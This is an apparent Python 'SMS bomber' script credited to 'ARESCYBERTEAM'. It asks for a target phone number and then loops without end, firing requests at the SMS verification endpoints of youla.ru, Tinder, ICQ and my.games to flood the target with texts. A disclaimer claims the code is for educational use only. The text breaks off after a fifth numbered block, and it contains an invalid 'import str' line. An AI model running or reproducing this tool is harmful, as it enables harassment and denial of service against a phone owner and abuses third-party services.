import requests, random
import urllib
import colorama
import os
import str

print("""
     _.-^^---....,,----       
 _--        sms        --__  
<          bomber         >)
|      developed by:  | 
 \._ARESCYBERTEAM _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
""")

"""
Kod ile yapacağınız herhangi bir işlemden ben sorumlu değilim. Bu riski göz önüne alarak kullanın.
This application is for private or educational purposes only.
Do not use it on other people without their permission. 
I do not accept responsibility for caused by the use of this code.
By using the this code,you automatically accept that you yourself are criminally responsible for yourself and you are aware that it violates the guidelines.
"""

colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']

_phone = input('Enter Target Phone Number Without (+):')
_name = ''

for x in range(12):
	_name = _name + random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM123456789'))
	password = _name + random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM123456789'))
	username = _name + random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM123456789'))

_phone9 = _phone[1:]

num = _phone
numplus = '+' + num
print(random.choice(colors))
while True:
#1
    try:
        print(requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":numplus}))
    except:
        print("Failed.")
#2
    try:
        print(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', json= {"phone_number":numplus}))
    except:
        print("Failed.")
#3
    try:
        print(requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763'.format(num)))
    except:
        print("Failed.")
#4
    try:
        print(requests.post('https://account.my.games/signup_send_sms/', data={'phone': _phone}))
    except:
        print("Failed.")
#5